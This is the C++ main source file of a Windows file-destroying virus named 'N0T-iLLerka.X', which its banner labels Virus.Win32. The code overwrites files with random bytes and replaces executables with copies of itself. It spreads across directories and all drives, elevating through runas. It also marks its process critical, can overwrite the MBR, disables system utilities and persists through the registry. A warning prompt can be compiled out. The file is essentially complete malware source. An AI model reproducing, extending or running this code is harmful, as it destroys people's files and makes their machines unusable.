/*-------------------------------------------------------------------------------------------\    /-------------------------------------\
 |  ______  _________________     __ ___     ___    _______        __      ____    ____  ___ |    |  ____            ______  ___  ____  |
 |  \     \ \   _  \__   ___/    |__|   |   |   |   \____  \______|  | __ / |  |   \   \/  / |    | |   _|     ____ |__\   \/  / |_   | |
 |  /   |  \/  /_\  \|   | ______|  |   |   |   |     _(_  <_  __ \  |/ //  |  |_   \     /  |    | |  |      /    \|  |\     /    |  | |
 | /    |   \  \_/   \   |/_____/|  |   |___|   |___ /      \  | \/    </   ^   /   /     \  |    | |  |     |   |  \  |/     \    |  | |
 | \____|_  /\_____  /___|       |__|______ \______ /_____  /__|  |__|_ \___   | /\/___/\  \ |    | |  |_  /\|___|  /__/___/\  \  _|  | |
 | 	      \/       \/                      \/      \/     \/           \/   |__| \/      \_/ |    | |____| \/     \/         \_/ |____| |
 +--------------------------------------------------------------------+----------------------/    \-------------------------------------/
 | N0T-iLLerka.X [.niX] your File Killa]    [Virus.Win32.VC Type: .X] |
 | by Lima X [L4X] / [G-C-E-R] © 2k19       [dev-VER: 0.5.1 BETA-2]   |
 \--------------------------------------------------------------------*/

#include "../Header-Files/pch.h"
#include "../Header-Files/N0T-iLLerka.h"

INT APIENTRY wWinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR lpCmdLine,
	_In_ int nShowCmd
) {
	// Read Commandline Arguments
	INT nArgs;
	LPWSTR* szArglist = CommandLineToArgvW(GetCommandLine(), &nArgs);

	// Check if ArgumentList was Created, if not: Exit Malware
	if (!szArglist) {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't parse Commandline", L"CommandLineToArgvW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG

		ExitProcess(EXIT_FAILURE);
	}

	// Get Process Heap Handle to free Argslist later on
	HANDLE hHeap = GetProcessHeap();

	// Save current Directory to Buffer
	WCHAR szCd[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, szCd);
	// Save current Filename to Buffer
	WCHAR szMfn[MAX_PATH];
	GetModuleFileName(NULL, szMfn, MAX_PATH);

	if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/exec"))) { // ## Start of /exec ## Malware Payload execution ######################################
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Executing with Argument: /exec", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
#endif // DEBUG_MSG

		// Check if /host Mutex exists, if not: Exit Malware
		HANDLE hSmpo = NULL;
		if (fnCheckMutexW(szHOST_MUTEX)) {
			// Check if /host Semaphore exists, if not: Exit Malware
			hSmpo = fnCheckSemaphoreW(szHOST_SEMAPHORE);
			BOOL bContinue = FALSE;
			DWORD dwWFSO;
			if (hSmpo) {
				// Wait until Semaphore is available
				while (!bContinue) {
					dwWFSO = WaitForSingleObject(hSmpo, 100);
					switch (dwWFSO) {
					case WAIT_OBJECT_0:
						bContinue = TRUE;
						break;
					case WAIT_TIMEOUT:
						break;
					case WAIT_FAILED:
#ifdef DEBUG_MSG
						MessageBox(NULL, L"Wait failed", L"WaitForSingleObject", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
						HeapFree(hHeap, NULL, szArglist);
						ExitProcess(EXIT_FAILURE);
					}
				}
			} else {
				// TODO: Remove this
				// if no semaphoreobject is available then continue without
				HeapFree(hHeap, NULL, szArglist);
				ExitProcess(EXIT_FAILURE);
			}
		} else {
			HeapFree(hHeap, NULL, szArglist);
			ExitProcess(EXIT_FAILURE);
		}

		//// BETA ////
		// DirectoryIterat0r 1.0 //
		std::vector<std::wstring> vszDir, vszFile;
		if (fnDirectoryIteratorW(szCd, L"*", &vszDir, &vszFile)) {
			// FileCorrupt0r 1.0 //
			LARGE_INTEGER liFs;
			DWORD dwNOBW;
			for (std::wstring i : vszFile) {
				HANDLE hFile = CreateFile(i.c_str(), GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
				if (hFile) {
					if (!lstrcmp(PathFindExtension(i.c_str()), L".exe")) {
						if (lstrcmp(i.c_str(), szMfn)) {
							if (SetFileAttributes(i.c_str(), FILE_ATTRIBUTE_NORMAL)) {
								if (!CopyFile(szMfn, i.c_str(), FALSE)) {
#ifdef DEBUG_MSG
									//										MessageBox(NULL, pszDest, MALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
								}
							} else {
#ifdef DEBUG_MSG
								MessageBox(NULL, L"Couldn't set File Attribute", L"SetFileAttributes", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
							}
						}
					} else if (GetFileSizeEx(hFile, &liFs)) {
						// TODO: Rewrite this b*llshit
						if (liFs.QuadPart <= nMAX_BUFFER_SIZE) {
							PWCHAR pszRdDs = new WCHAR[liFs.QuadPart];

							if (BCryptGenRandom(NULL, (LPBYTE)pszRdDs, liFs.QuadPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
#ifdef DEBUG_MSG
								MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
								ZeroMemory(pszRdDs, liFs.QuadPart);
							}

							if (!WriteFile(hFile, pszRdDs, liFs.QuadPart, &dwNOBW, NULL)) {
#ifdef DEBUG_MSG
								MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
							}

							delete[] pszRdDs;
						} else {
							PWCHAR pszRdCs = new WCHAR[nMAX_BUFFER_SIZE];

							if (BCryptGenRandom(NULL, (LPBYTE)pszRdCs, nMAX_BUFFER_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG)) {
#ifdef DEBUG_MSG
								MessageBox(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom", MB_OK | MB_ICONWARNING | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
								ZeroMemory(pszRdCs, nMAX_BUFFER_SIZE);
							}

							if (!WriteFile(hFile, pszRdCs, nMAX_BUFFER_SIZE, &dwNOBW, NULL)) {
#ifdef DEBUG_MSG
								MessageBox(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
							}

							delete[] pszRdCs;
						}
					}

					CloseHandle(hFile);
				} else {
#ifdef DEBUG_MSG
					MessageBox(NULL, L"Couldn't open existing File", szMALWR_NAME, MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
#endif // DEBUG_MSG
				}
			}

			// DirectoryInfector
			std::wstring szNfn;
			for (std::wstring i : vszDir) {
				szNfn = i + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
				CopyFile(szMfn, szNfn.c_str(), FALSE);
				ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
			}
		}

		if (hSmpo) {
			ReleaseSemaphore(hSmpo, 1, NULL);
		}
		HeapFree(hHeap, NULL, szArglist);
		ExitProcess(EXIT_SUCCESS);
// ######## End of /exec ############################################################################################################################
	} else if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/host"))) { // ## Start of /host ## Malware Host with/without Malware initialization ########
#ifdef DEBUG_MSG
		if ((nArgs > 2) && (!lstrcmp(szArglist[2], L"/init"))) {
			MessageBox(NULL, L"Executing with Argument: /init\nInitializing Malware", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
		} else {
			MessageBox(NULL, L"Executing with Argument: /host\nLaunching MalwareHost", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
		}
#endif // DEBUG_MSG

		if (!fnIsUserAdmin()) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Process isn't Administrator", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			HeapFree(hHeap, NULL, szArglist);
			ExitProcess(EXIT_FAILURE);
		}

		if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", L"SetPriorityClass", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
#endif // DEBUG_MSG
		}

#ifndef DISABLE_MUTEX
		// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
		if (fnCheckMutexW(szHOST_MUTEX)) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Malware Host is already running\n(Mutex already exist)", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
#endif // DEBUG_MSG

			HeapFree(hHeap, NULL, szArglist);
			ExitProcess(EXIT_FAILURE);
		} else {
			// Create /host Mutex for /exec operation
			HANDLE hMutex = CreateMutex(NULL, TRUE, szHOST_MUTEX);
			if (!hMutex) {
#ifdef DEBUG_MSG
				MessageBox(NULL, L"Couldn't create /host Mutex", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
				HeapFree(hHeap, NULL, szArglist);
				ExitProcess(EXIT_FAILURE);
			}
		}
#endif // !DISABLE_MUTEX

#ifndef DISABLE_SEMAPHORE
		// Create /host Semaphore for /exec operation
		HANDLE hSemaphore = CreateSemaphore(NULL, nSEMAPHORE, 5000, szHOST_SEMAPHORE);
		if (!hSemaphore) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Couldn't create /host Semaphore", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			HeapFree(hHeap, NULL, szArglist);
			ExitProcess(EXIT_FAILURE);
		}
#endif // !DISABLE_SEMAPHORE

#ifndef DISABLE_NT_FUNCTIONS
		// Set Process as critical
		if (fnNTSetProcessIsCritical(TRUE)) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"HostProcess is now Critical", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
#endif // DEBUG_MSG
		}
#endif // !DISABLE_NT_FUNCTIONS

		// Initialize the Malware
		if ((nArgs > 2) && (!lstrcmp(szArglist[2], L"/init"))) { // ## Start of /init ## Malware initialization #####################################
#ifdef KILL_MBR
			fnOverwriteMBR();
#endif // KILL_MBR
#ifndef DISABLE_REG_PROTECTIONS
			fnDisableUtilities();
#endif // !DISABLE_REG_PROTECTIONS

			// Enumerate Drives
			std::vector<std::wstring> vszDrives;
			std::wstring szNfn;
			if (fnDriveEnumeratorW(&vszDrives)) {
				// Copy & Execute Malware in all enumerated Drives
				for (std::wstring i : vszDrives) {
					szNfn = i + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";

					if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
						ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
					} else {
#ifdef DEBUG_MSG
						MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
					}
				}
			} else {
				// If DriveEnumerator fails, try C:\ Directory
				szNfn = L"C:\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";

				if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
				} else {
#ifdef DEBUG_MSG
					MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
				}
			}

			// Create Registry Key
			if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, szREGISTRY_KEY, TRUE, NULL, NULL, NULL)) {
				if (!fnCreateRegistryKeyW(HKEY_CURRENT_USER, szREGISTRY_KEY, TRUE, NULL, NULL, NULL)) {

				}
			}
		} // ######## End of /init ##################################################################################################################

		// Deadlock
		HeapFree(hHeap, NULL, szArglist);
		Sleep(INFINITE);
	} // ######## End of /host ######################################################################################################################

	// If no Arguments were passed ...

	// Create Random String to Copy host into AppData if necessary
	PWSTR pszShkfp;
	SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &pszShkfp);
	std::wstring szAdpn = (std::wstring)pszShkfp + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN));
	std::wstring szAdfn = szAdpn + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
	CoTaskMemFree(pszShkfp);

	// Check Registry Key/Type/Value
	if (fnCheckRegistryKeyW(szREGISTRY_KEY)) {
		if (!fnIsUserAdmin()) {
			ShellExecute(NULL, L"runas", szMfn, NULL, NULL, SW_SHOWDEFAULT);

			HeapFree(hHeap, NULL, szArglist);
			ExitProcess(EXIT_FAILURE);
		}

		if (!fnCheckMutexW(szHOST_MUTEX)) {
			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host", NULL, SW_SHOWDEFAULT);
			} else {
				HeapFree(hHeap, NULL, szArglist);
				ExitProcess(EXIT_FAILURE);
			}
		}

		// TODO: maybe improve this (for loop or something)
		INT nKillswitch = 0;
		while (!fnCheckMutexW(szHOST_MUTEX)) {
			if (nKillswitch == 50) {
#ifdef DEBUG_MSG
				MessageBox(NULL, L"Malware Host failed to launch", szMALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
				HeapFree(hHeap, NULL, szArglist);
				ExitProcess(EXIT_FAILURE);
			}

			nKillswitch++;
			Sleep(100);
		}

		ShellExecute(NULL, L"runas", szMfn, L"/exec", NULL, SW_SHOWDEFAULT);
	} else {
#ifndef DISABLE_WARNING
		// Warn User about the execution of the Malware
		if (MessageBox(NULL, L"The Software you're trying to execute is considered Malware !\n\n"
			L"Running this Malware will result in your Computer being unusable "
			L"and your Files being irreparably damaged/destroyed.\n\n"
			L"If you're seeing this Message without knowing what you just executed, simply press NO and nothing will happen.\n"
			L"If you know what you're doing press YES to continue.\n\n"
			L"DO YOU WANT TO EXECUTE THIS MALWARE ?", L"N0T-iLLerka.X", MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
#endif // !DISABLE_WARNING
			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
			} else {
				HeapFree(hHeap, NULL, szArglist);
				ExitProcess(EXIT_FAILURE);
			}
#ifndef DISABLE_WARNING
		}
#endif // !DISABLE_WARNING
	}

	HeapFree(hHeap, NULL, szArglist);
	return EXIT_SUCCESS;
}